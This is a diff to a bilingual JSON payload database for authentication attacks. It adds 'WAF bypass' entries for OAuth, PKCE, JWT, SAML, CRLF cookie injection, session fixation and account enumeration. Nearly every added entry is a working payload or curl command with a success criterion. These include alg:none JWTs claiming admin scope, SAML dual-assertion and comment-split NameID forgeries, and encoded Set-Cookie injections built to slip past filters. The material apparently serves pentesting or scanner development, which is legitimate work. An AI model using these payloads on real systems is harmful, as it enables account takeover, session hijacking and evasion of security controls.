       "id": "auth2-authorization-code",
@@ -2053,8 +2565,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "OAuth 授权码",
-        "en": "OAuth Authorization Code"
+        "zh": "OAuth 与 OIDC 流程攻击",
+        "en": "OAuth & OIDC Flow Attacks"
       },
       "tutorial": {
         "overview": {
@@ -2126,6 +2638,41 @@
       "tags": [
         "auth2",
         "authorization_code"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "双 code 参数污染",
+            "en": "Duplicate code Pollution"
+          },
+          "command": "code=STOLEN_CODE&code=REPLAYED_CODE",
+          "description": {
+            "zh": "校验与消耗取不同 code 实例实现重放。成功判据：已用 code 再次完成令牌交换。",
+            "en": "Validation and consumption read different code instances enabling replay. Success: a used code completes token exchange again."
+          }
+        },
+        {
+          "title": {
+            "zh": "grant_type 变换",
+            "en": "grant_type Swap"
+          },
+          "command": "grant_type=refresh_token&code=STOLEN_CODE&refresh_token=STOLEN_CODE",
+          "description": {
+            "zh": "把授权码塞进 refresh_token 通道绕过 code 单次校验。成功判据：返回新 access_token。",
+            "en": "Feeding the code through the refresh_token grant bypasses single-use code checks. Success: a new access_token is returned."
+          }
+        },
+        {
+          "title": {
+            "zh": "编码 code 值",
+            "en": "Encoded code Value"
+          },
+          "command": "code=U1RPSExFTl9DT0RF\nclient_id=app&grant_type=authorization_code",
+          "description": {
+            "zh": "base64 形态在解码层还原，绕过 code 黑名单精确匹配。成功判据：编码值完成交换。",
+            "en": "The base64 form resolves at the decode layer, bypassing exact-match code blacklists. Success: the encoded value completes exchange."
+          }
+        }
       ]
     },
     {
@@ -2167,8 +2714,8 @@
         "en": "CSRF Cross-Site Request Forgery"
       },
       "subCategory": {
-        "zh": "OAuth 登录 CSRF",
-        "en": "OAuth Login CSRF"
+        "zh": "OAuth 与遗留跨域边界",
+        "en": "OAuth & Legacy Cross-Domain"
       },
       "tutorial": {
         "overview": {
@@ -2236,7 +2783,53 @@
           "rewrote-attack-chain",
           "added-references"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "数组参数类型混淆",
+            "en": "Array-parameter type juggling"
+          },
+          "command": "state[]=csrf_token&state[]=attacker_state",
+          "description": {
+            "zh": "数组形态绕过字符串等值校验。判据：回调仍被接受且 state 校验被跳过。",
+            "en": "Array form bypasses string equality. Success: callback accepted with state check skipped."
+          }
+        },
+        {
+          "title": {
+            "zh": "HPP 双参数污染",
+            "en": "HPP double-parameter pollution"
+          },
+          "command": "state=valid_state&state=attacker_state",
+          "description": {
+            "zh": "前后端对重复参数取值不同导致校验旁路。判据：以攻击者 state 完成流程。",
+            "en": "Divergent picks between front and backend on repeated params. Success: flow completes with the attacker state."
+          }
+        },
+        {
+          "title": {
+            "zh": "超长填充截断",
+            "en": "Overlong padding truncation"
+          },
+          "command": "state=csrf_tokenAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+          "description": {
+            "zh": "超长值使校验层截断比较通过。判据：流程推进到回调。",
+            "en": "Truncation at the validation layer lets the check pass. Success: flow reaches the callback."
+          }
+        },
+        {
+          "title": {
+            "zh": "空字节后缀",
+            "en": "Null-byte suffix"
+          },
+          "command": "state=csrf_token%00attacker",
+          "description": {
+            "zh": "C 语言式比较在空字节处提前相等。判据：state 判定通过。",
+            "en": "Comparison stops early at the null byte. Success: state check passes."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-token-aud-scope",
@@ -2277,8 +2870,8 @@
         "en": "JWT Security"
       },
       "subCategory": {
-        "zh": "Audience 与 Scope",
-        "en": "Audience and Scope"
+        "zh": "令牌伪造与会话攻击",
+        "en": "Token Forgery & Session Attacks"
       },
       "tutorial": {
         "overview": {
@@ -2346,7 +2939,42 @@
           "rewrote-attack-chain",
           "added-references"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "头部变形：aud 数组多值",
+            "en": "Header Mutation: aud Array Multivalue"
+          },
+          "command": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();print(e({'alg':'none','typ':'JWT'})+'.'+e({'aud':['api','admin','internal'],'scope':'openid profile admin'})+'')\"",
+          "description": {
+            "zh": "aud 写成数组把 admin 混入合法值列表，绕过字符串精确匹配的 aud 校验；成功判据：以 admin 上下文通过鉴权。",
+            "en": "Writing aud as an array hides admin among legitimate values, evading exact-string aud checks. Success: authorization passes with admin context."
+          }
+        },
+        {
+          "title": {
+            "zh": "头部变形：scope 大小写与分隔符",
+            "en": "Header Mutation: scope Case and Separator"
+          },
+          "command": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();print(e({'alg':'none','typ':'JWT'})+'.'+e({'aud':'api','scope':'openid profile ADMIN read:all write:all'})+'')\"",
+          "description": {
+            "zh": "scope 值大写化与加前缀写法，利用实现层大小写不敏感/前缀匹配缺陷；成功判据：获得管理面访问。",
+            "en": "Uppercase and prefixed scope values exploit case-insensitive or prefix-matching implementations. Success: admin-surface access is granted."
+          }
+        },
+        {
+          "title": {
+            "zh": "头部变形：缺省 aud 加多 scope 注入",
+            "en": "Header Mutation: Missing aud with Multi-scope"
+          },
+          "command": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();print(e({'alg':'none','typ':'JWT'})+'.'+e({'sub':'1','scope':'openid admin.* internal/*'})+'')\"",
+          "description": {
+            "zh": "不写 aud 规避 audience 校验路径，scope 用通配写法命中宽松授权匹配；成功判据：通配 scope 被当作有效权限。",
+            "en": "Omitting aud skips audience validation while wildcard scopes exploit lenient authorization matching. Success: wildcard scopes are honored."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-pkce",
@@ -2387,8 +3015,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "OAuth PKCE",
-        "en": "OAuth PKCE"
+        "zh": "OAuth 与 OIDC 流程攻击",
+        "en": "OAuth & OIDC Flow Attacks"
       },
       "tutorial": {
         "overview": {
@@ -2456,7 +3084,42 @@
           "added-references",
           "defined-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "method 降级",
+            "en": "Method Downgrade"
+          },
+          "command": "code_challenge=PLAINTEXT_CHALLENGE&code_challenge_method=plain",
+          "description": {
+            "zh": "省略 S256 强制校验时 plain 方法允许明文 challenge 伪造。成功判据：verifier 不匹配仍换到令牌。",
+            "en": "When S256 enforcement is missing, the plain method allows forging the challenge. Success: tokens are issued despite a verifier mismatch."
+          }
+        },
+        {
+          "title": {
+            "zh": "空 verifier 变形",
+            "en": "Empty Verifier Variants"
+          },
+          "command": "code_verifier=%20&code_challenge=BBBCCC\ncode_verifier=null&code_challenge=BBBCCC",
+          "description": {
+            "zh": "空白/null 形态绕过必填与比对。成功判据：空 verifier 通过校验。",
+            "en": "Whitespace/null forms bypass required-field checks and comparison. Success: an empty verifier validates."
+          }
+        },
+        {
+          "title": {
+            "zh": "双 challenge 覆盖",
+            "en": "Duplicate challenge Override"
+          },
+          "command": "code_challenge=AAA&code_challenge=BBB&code_verifier=verifier_for_AAA",
+          "description": {
+            "zh": "注册与验证阶段取不同 challenge 实例实现错配。成功判据：错配组合完成令牌交换。",
+            "en": "Registration and validation read different challenge instances allowing mismatch. Success: the mismatched pair completes token exchange."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-saml-xml",
@@ -2497,8 +3160,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "SAML 断言验证",
-        "en": "SAML Assertion Validation"
+        "zh": "SAML 断言与联邦身份攻击",
+        "en": "SAML Assertion & Federated Identity Attacks"
       },
       "tutorial": {
         "overview": {
@@ -2565,7 +3228,42 @@
           "added-references",
           "defined-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "实体编码 NameID",
+            "en": "Entity-Encoded NameID"
+          },
+          "command": "<!-- comment --><NameID>&#97;dmin@{TARGET}</NameID>",
+          "description": {
+            "zh": "HTML 实体编码绕过 NameID 内容比对与 WAF 特征。成功判据：解码后命中 admin 账户。",
+            "en": "HTML entity encoding bypasses NameID comparison and WAF signatures. Success: decodes to the admin account."
+          }
+        },
+        {
+          "title": {
+            "zh": "注释拆分标签",
+            "en": "Comment-Split Tags"
+          },
+          "command": "<Name<!--x-->ID>admin@{TARGET}</NameID>",
+          "description": {
+            "zh": "注释插入标签内部，绕过基于标签结构的过滤且部分解析器仍还原。成功判据：解析后 NameID 值生效。",
+            "en": "Comments inside the tag bypass structure-based filters while some parsers still resolve it. Success: the NameID value takes effect after parsing."
+          }
+        },
+        {
+          "title": {
+            "zh": "双断言覆盖",
+            "en": "Dual Assertion Override"
+          },
+          "command": "<saml:Assertion ID=\"_evil\"><saml:Subject><saml:NameID>admin@{TARGET}</saml:NameID></saml:Subject></saml:Assertion><saml:Assertion ID=\"_signed\">SIGNED_CONTENT</saml:Assertion>",
+          "description": {
+            "zh": "前插未签名断言，验证器取签名断言而应用取首个。成功判据：以 admin 身份登录。",
+            "en": "Prepending an unsigned assertion while the validator reads the signed one and the app reads the first. Success: logged in as admin."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-oauth",
@@ -2606,8 +3304,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "OAuth 流程约束",
-        "en": "OAuth Flow Constraints"
+        "zh": "OAuth 与 OIDC 流程攻击",
+        "en": "OAuth & OIDC Flow Attacks"
       },
       "tutorial": {
         "overview": {
@@ -2675,7 +3373,42 @@
           "rewrote-attack-chain",
           "added-references"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "数组化 response_type",
+            "en": "Arrayed response_type"
+          },
+          "command": "response_type[]=code&response_type[]=token\nresponse_type[]=code&response_type[]=id_token",
+          "description": {
+            "zh": "数组形态绕过枚举白名单，join 后形成混合流程。成功判据：返回混合 grant（含 token）。",
+            "en": "Array forms bypass enum whitelists and join into a hybrid flow. Success: a hybrid grant including token is returned."
+          }
+        },
+        {
+          "title": {
+            "zh": "制表符分隔组合",
+            "en": "Tab-Separated Combo"
+          },
+          "command": "response_type=code%09token\nresponse_type=id_token%09token",
+          "description": {
+            "zh": "用 %09 替代空格分隔多值 response_type，绕过空格特征匹配。成功判据：隐式流令牌下发。",
+            "en": "Using %09 instead of spaces to delimit multi-value response_type bypasses space-signature matching. Success: implicit-flow tokens are issued."
+          }
+        },
+        {
+          "title": {
+            "zh": "参数删除组合",
+            "en": "Parameter Removal Combo"
+          },
+          "command": "response_type=token&prompt=none&nonce=",
+          "description": {
+            "zh": "省略 state/nonce 并加 prompt=none 走无交互隐式流。成功判据：无需交互返回令牌。",
+            "en": "Omitting state/nonce with prompt=none drives a no-interaction implicit flow. Success: tokens return without interaction."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-",
@@ -2716,8 +3449,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "账号枚举",
-        "en": "Account Enumeration"
+        "zh": "凭证注入与弱类型登录绕过",
+        "en": "Credential Injection & Weak-Typing Login Bypass"
       },
       "tutorial": {
         "overview": {
@@ -2784,7 +3517,42 @@
           "rewrote-attack-chain",
           "added-references"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "大小写字典变体",
+            "en": "Case-Mutated Dictionary"
+          },
+          "command": "administrator\nAdministrator\nADMINISTRATOR\nroot\nROOT\nsysadmin\nSysAdmin",
+          "description": {
+            "zh": "绕过用户名大小写归一化前的枚举防护：响应差异仍暴露存在性。成功判据：不同大小写形态返回可区分响应。",
+            "en": "Bypasses enumeration defenses applied before case normalization since response differences still leak existence. Success: case variants return distinguishable responses."
+          }
+        },
+        {
+          "title": {
+            "zh": "URL 编码用户名",
+            "en": "URL-Encoded Usernames"
+          },
+          "command": "username=%61dmin\nusername=%72oot\nusername=%73ysadmin",
+          "description": {
+            "zh": "编码形态绕过用户名黑名单与 WAF 特征。成功判据：编码值返回与明文相同的枚举信号。",
+            "en": "Encoded forms bypass username blacklists and WAF signatures. Success: encoded values return the same enumeration signal as plaintext."
+          }
+        },
+        {
+          "title": {
+            "zh": "JSON 提交时序探测",
+            "en": "JSON Timing Enumeration"
+          },
+          "command": "curl -sS --max-time 5 -o /dev/null -w \"%{time_total}\\n\" -H \"Content-Type: application/json\" -d '{\"username\":\"admin\",\"password\":\"PAYLOADER_WRONG\"}' http://127.0.0.1:8080/login",
+          "description": {
+            "zh": "换 JSON 通道并测量时延差异放大存在性信号（存在用户走哈希路径更慢）。成功判据：存在/不存在用户时延差稳定可复现。",
+            "en": "Switching to JSON and measuring timing amplifies existence signals (existing users take the hashing path). Success: a stable, reproducible timing gap between existing and missing users."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-api",
@@ -2825,8 +3593,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "API 资源枚举",
-        "en": "API Resource Enumeration"
+        "zh": "API 与 RPC 攻击面发现",
+        "en": "API & RPC Attack Surface Discovery"
       },
       "tutorial": {
         "overview": {
@@ -2894,7 +3662,42 @@
           "rewrote-attack-chain",
           "added-references"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "版本与复数路径变形",
+            "en": "Version & Plural Path Mutation"
+          },
+          "command": "/api/v3/user/admin\n/api/users/search?q=admin\n/api/user/admins\n/api//user/admin",
+          "description": {
+            "zh": "版本号、复数与双斜杠变形命中未做枚举防护的路由别名。成功判据：变形路径返回用户存在性差异。",
+            "en": "Version, plural, and double-slash mutations hit route aliases without enumeration protection. Success: mutated paths leak user existence."
+          }
+        },
+        {
+          "title": {
+            "zh": "数字 ID 遍历",
+            "en": "Numeric ID Traversal"
+          },
+          "command": "/api/user/1\n/api/user/2\n/api/user/3\n/api/users/1?fields=username,email",
+          "description": {
+            "zh": "数字主键遍历绕过用户名枚举防护的假设。成功判据：逐 ID 返回用户资料。",
+            "en": "Numeric primary-key traversal bypasses username-oriented enumeration defenses. Success: profiles return per ID."
+          }
+        },
+        {
+          "title": {
+            "zh": "Accept 变换探测",
+            "en": "Accept Mutation Probe"
+          },
+          "command": "curl -sS --max-time 5 -H \"Accept: application/vnd.api+json\" http://{TARGET}/api/user/admin",
+          "description": {
+            "zh": "JSON:API 媒体类型触发不同序列化器泄露字段。成功判据：返回包含存在性信号的响应体。",
+            "en": "The JSON:API media type triggers a different serializer that leaks fields. Success: the response body contains existence signals."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-graphql",
@@ -2935,8 +3738,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "GraphQL 枚举",
-        "en": "GraphQL Enumeration"
+        "zh": "GraphQL 授权与滥用",
+        "en": "GraphQL Authorization & Abuse"
       },
       "tutorial": {
         "overview": {
@@ -3004,7 +3807,42 @@
           "added-references",
           "defined-graphql-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "变量传参枚举",
+            "en": "Variable-Passed Enumeration"
+          },
+          "command": "{\"query\":\"query($u:String!){user(username:$u){id}}\",\"variables\":{\"u\":\"admin\"}}",
+          "description": {
+            "zh": "用户名移入变量绕过查询体中 username 字面特征。成功判据：返回目标用户 id。",
+            "en": "Moving usernames into variables masks literal signatures in the query body. Success: the target user's id returns."
+          }
+        },
+        {
+          "title": {
+            "zh": "别名批量枚举",
+            "en": "Aliased Batch Enumeration"
+          },
+          "command": "query{a:user(username:\"admin\"){id} b:user(username:\"test\"){id} c:user(username:\"root\"){id} d:user(username:\"guest\"){id}}",
+          "description": {
+            "zh": "单请求别名批量枚举绕过每请求一次的枚举限速。成功判据：一批用户名存在性同时返回。",
+            "en": "Aliased batching bypasses per-request enumeration rate limits. Success: existence for a batch of usernames returns at once."
+          }
+        },
+        {
+          "title": {
+            "zh": "错误差异侧信道",
+            "en": "Error-Divergence Side Channel"
+          },
+          "command": "curl -sS --max-time 5 -X POST http://{TARGET}/graphql -H \"Content-Type: application/json\" -d '{\"query\":\"{user(username:\\\"definitely_missing_9f2c\\\")){id}}\"}' -w \"\\n%{time_total}\"",
+          "description": {
+            "zh": "对比存在/不存在用户的错误文本与时延差异确认枚举信号。成功判据：两类请求可稳定区分。",
+            "en": "Comparing error text and timing between existing and missing users confirms the enumeration signal. Success: the two classes are stably distinguishable."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-set-cookie-crlf",
@@ -3115,7 +3953,64 @@
           "added-references",
           "defined-wire-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "双重/三重 URL 编码",
+            "en": "Double/triple URL-encoding"
+          },
+          "command": "%250d%250aSet-Cookie:%20sessionid=attacker_session_id\n%25250d%25250aSet-Cookie:%20sessionid=attacker_session_id\n%250d%250a%250d%250aSet-Cookie:%20sessionid=attacker_session_id\n%250D%250ASet-Cookie:%20JSESSIONID=attacker_session_id",
+          "description": {
+            "zh": "绕过单次解码后匹配 %0d%0aSet-Cookie 的 WAF：应用二次解码时双重编码逐层还原；成功判据：响应头多出攻击者可控的 sessionid/JSESSIONID Cookie（响应中出现两个 Set-Cookie 行）。",
+            "en": "Bypasses WAFs matching %0d%0aSet-Cookie after a single decode: double encoding peels back when the application decodes twice; success criterion: an attacker-controlled sessionid/JSESSIONID cookie appears as an extra Set-Cookie line in the response."
+          }
+        },
+        {
+          "title": {
+            "zh": "头名大小写与 OWS 变形",
+            "en": "Header-name case and OWS variants"
+          },
+          "command": "%0d%0aSET-COOKIE:sessionid=attacker_session_id\n%0d%0aset-cookie:sessionid=attacker_session_id\n%0d%0aSet-Cookie:sessionid=attacker_session_id\n%0d%0aSet-Cookie :sessionid=attacker_session_id\n%0d%0aSet-Cookie:%09sessionid=attacker_session_id",
+          "description": {
+            "zh": "绕过对 \"%0d%0aSet-Cookie: \"（含空格）精确模板的规则：全大写/小写头名、去空格、冒号前空格与制表符均被响应解析器归一为合法 Set-Cookie；成功判据：会话 Cookie 被注入覆盖（客户端拿到 attacker_session_id）。",
+            "en": "Bypasses rules on the exact \"%0d%0aSet-Cookie: \" template: all-caps/lowercase names, missing space, space-before-colon and tab are all normalized as a valid Set-Cookie by response parsers; success criterion: the injected cookie overrides the session (client holds attacker_session_id)."
+          }
+        },
+        {
+          "title": {
+            "zh": "仅 LF/仅 CR 分隔注入",
+            "en": "Bare-LF / bare-CR injection"
+          },
+          "command": "%0aSet-Cookie: sessionid=attacker_session_id\n%0aSet-Cookie: JSESSIONID=attacker_session_id\n%0dSet-Cookie: PHPSESSID=attacker_session_id\n%0a%0aSet-Cookie: connect.sid=attacker_session_id",
+          "description": {
+            "zh": "绕过只拦截成对 %0d%0a 的规则：不少容器（Node/Python 部分服务器）接受裸 LF 或裸 CR 作为头边界；成功判据：仅 LF 或仅 CR 变体仍在响应中注入 Cookie。",
+            "en": "Bypasses rules blocking only the paired %0d%0a: several stacks (Node/Python servers) accept bare LF or bare CR as header boundaries; success criterion: a bare-LF or bare-CR variant still injects the cookie into the response."
+          }
+        },
+        {
+          "title": {
+            "zh": "值与定界符编码变形",
+            "en": "Value and delimiter encoding variants"
+          },
+          "command": "%0d%0aSet-Cookie%3Asessionid%3Dattacker_session_id\n%0d%0aSet-Cookie:sessionid%3Dattacker_session_id\n%0d%0aSet-Cookie:sessionid=attacker%5fsession%5fid\n%0d%0aSet-Cookie:%20sessionid%3Dattacker_session_id%3B%20Path%3D%2F",
+          "description": {
+            "zh": "绕过对 \"Set-Cookie: name=value\" 明文结构的规则：把冒号、等号、下划线、分号与 Path 属性整体 percent-encode，应用解码后语义完整；成功判据：注入 Cookie 生效且作用域为根路径（Path=/）。",
+            "en": "Bypasses rules on the plaintext \"Set-Cookie: name=value\" structure: percent-encoding the colon, equals, underscores, semicolon and Path attribute keeps semantics intact after application decoding; success criterion: the injected cookie takes effect scoped to the root path (Path=/)."
+          }
+        },
+        {
+          "title": {
+            "zh": "空字节前缀与 Unicode 变形",
+            "en": "Null-byte prefix and Unicode variants"
+          },
+          "command": "%00%0d%0aSet-Cookie: sessionid=attacker_session_id\n%0d%00%0aSet-Cookie: sessionid=attacker_session_id\n%u000d%u000aSet-Cookie: sessionid=attacker_session_id\n%c0%8d%c0%8aSet-Cookie: sessionid=attacker_session_id",
+          "description": {
+            "zh": "绕过在 NUL 处截断或仅匹配标准编码的输入校验：NUL 中缀被宽容容器丢弃、%u 宽转义与 %c0%8d 过长编码在旧解析器还原为 CRLF；成功判据：响应中仍出现注入的 Set-Cookie 行。",
+            "en": "Bypasses input validation that truncates at NUL or matches only canonical encodings: lenient containers drop the null infix, while %u wide escapes and %c0%8d overlong sequences decode to CRLF on legacy parsers; success criterion: the injected Set-Cookie line still appears in the response."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-session-id-session-fixation",
@@ -3156,8 +4051,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "会话固定",
-        "en": "Session Fixation"
+        "zh": "会话与 Cookie 劫持",
+        "en": "Session & Cookie Hijacking"
       },
       "tutorial": {
         "overview": {
@@ -3228,6 +4123,41 @@
       "tags": [
         "auth2",
         "session_id_session_fixation"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "URL 传参固定",
+            "en": "URL Parameter Seeding"
+          },
+          "command": "curl -sS --max-time 5 \"http://127.0.0.1:8080/login?PHPSESSID=attacker_known_session\" -d \"username=payloader&password=PAYLOADER_TEST\" -c fixed.cookies; grep -c attacker_known_session fixed.cookies",
+          "description": {
+            "zh": "会话标识经查询参数固定，登录后未轮换即成立。成功判据：登录后 Cookie 值仍为预设值。",
+            "en": "Seeding the session id via query string; success if not rotated after login. Success: the cookie value stays at the preset after login."
+          }
+        },
+        {
+          "title": {
+            "zh": "双 Cookie 叠加固定",
+            "en": "Cookie Stacking Fixation"
+          },
+          "command": "curl -sS --max-time 5 -b \"PHPSESSID=attacker_known_session; JSESSIONID=attacker_known_session\" -d \"username=payloader&password=PAYLOADER_TEST\" http://127.0.0.1:8080/login",
+          "description": {
+            "zh": "多框架 Cookie 并存，任一未轮换即固定成功。成功判据：任一框架登录后复用预设值。",
+            "en": "Multiple framework cookies coexist; any one not rotated means fixation. Success: any framework reuses the preset value after login."
+          }
+        },
+        {
+          "title": {
+            "zh": "编码会话值固定",
+            "en": "Encoded Session Value"
+          },
+          "command": "curl -sS --max-time 5 -b \"PHPSESSID=%61ttacker_known_session\" -d \"username=payloader&password=PAYLOADER_TEST\" http://127.0.0.1:8080/login",
+          "description": {
+            "zh": "编码值在解码层还原，绕过固定检测特征。成功判据：解码后预设会话被接受。",
+            "en": "Encoded values resolve at the decode layer, evading fixation-detection signatures. Success: the decoded preset session is accepted."
+          }
+        }
       ]
     },
     {
@@ -3269,8 +4199,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "URL 会话标识",
-        "en": "URL Session Identifiers"
+        "zh": "会话与 Cookie 劫持",
+        "en": "Session & Cookie Hijacking"
       },
       "tutorial": {
         "overview": {
@@ -3337,7 +4267,42 @@
           "rewrote-attack-chain",
           "added-references"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "参数名大小写变形",
+            "en": "Parameter-Name Casing"
+          },
+          "command": "?SESSION=attacker_session\n?SessionID=attacker_session\n?phpsessid=attacker_session",
+          "description": {
+            "zh": "大小写不同的参数名命中大小写不敏感的取参层。成功判据：会话从 URL 采信。",
+            "en": "Differently-cased parameter names hit case-insensitive extraction layers. Success: the session is honored from the URL."
+          }
+        },
+        {
+          "title": {
+            "zh": "路径尾部注入",
+            "en": "Path-Tail Injection"
+          },
+          "command": "http://127.0.0.1:8080/login;jsessionid=attacker_session\nhttp://127.0.0.1:8080/login;PHPSESSID=attacker_session",
+          "description": {
+            "zh": "分号路径参数形态注入会话标识（Java/PHP 路径会话兼容）。成功判据：登录后使用注入会话。",
+            "en": "Semicolon path parameters inject session ids (Java/PHP path-session compatibility). Success: login proceeds with the injected session."
+          }
+        },
+        {
+          "title": {
+            "zh": "双参数并存",
+            "en": "Duplicate Parameters"
+          },
+          "command": "?session=attacker_session&PHPSESSID=attacker_session&JSESSIONID=attacker_session",
+          "description": {
+            "zh": "多参数名并存命中实现实际读取的字段。成功判据：任一参数被采信为会话源。",
+            "en": "Multiple parameter names coexist to hit whichever the implementation reads. Success: any parameter is honored as the session source."
+          }
+        }
+      ]
     },
     {
       "id": "auth2-cookie-via-referer",
@@ -3378,8 +4343,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "Referer 会话解析",
-        "en": "Referer Session Parsing"
+        "zh": "会话与 Cookie 劫持",
+        "en": "Session & Cookie Hijacking"
       },
       "tutorial": {
         "overview": {
@@ -3451,6 +4416,41 @@
       "tags": [
         "auth2",
         "cookie_via_referer"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "多参数 Referer",
+            "en": "Multi-Parameter Referer"
+          },
+          "command": "curl -sS --max-time 5 -H \"Referer: https://{ATTACKER_HOST}/?JSESSIONID=x&PHPSESSID=y&session=z\" http://127.0.0.1:8080/login",
+          "description": {
+            "zh": "Referer 携带多框架会话参数命中实现读取字段。成功判据：任一会话被采信。",
+            "en": "Referer carrying multi-framework session parameters hits whatever the implementation reads. Success: any session is honored."
+          }
+        },
+        {
+          "title": {
+            "zh": "编码参数值",
+            "en": "Encoded Parameter Values"
+          },
+          "command": "curl -sS --max-time 5 -H \"Referer: https://{ATTACKER_HOST}/?session=%61ttacker_session\" http://127.0.0.1:8080/login",
+          "description": {
+            "zh": "编码值在解析 Referer 时还原为会话来源。成功判据：编码会话被接受。",
+            "en": "Encoded values resolve when parsing the Referer as a session source. Success: the encoded session is accepted."
+          }
